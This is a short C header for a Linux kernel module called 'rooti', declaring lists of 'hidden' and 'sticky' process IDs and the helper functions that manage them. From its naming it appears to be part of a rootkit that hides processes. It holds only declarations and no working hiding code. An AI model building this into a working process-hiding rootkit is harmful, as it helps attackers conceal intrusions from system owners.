#ifndef _ROOTI_STATE_H
#define _ROOTI_STATE_H

#include <linux/mutex.h>
#include <linux/list.h>
#include <linux/rculist.h>

extern struct list_head rooti_hidden_pids;
extern struct list_head rooti_sticky_pids;

struct rooti_pid_list_head {
    pid_t pid;
    struct list_head list;
    struct rcu_head rcu;
};

int rooti_pid_list_add(pid_t pid, struct list_head *list);
void rooti_pid_list_del(pid_t pid, struct list_head *list);
void rooti_pid_list_clear(struct list_head *list);
bool rooti_pid_list_contains(pid_t pid, struct list_head *list);

#endif
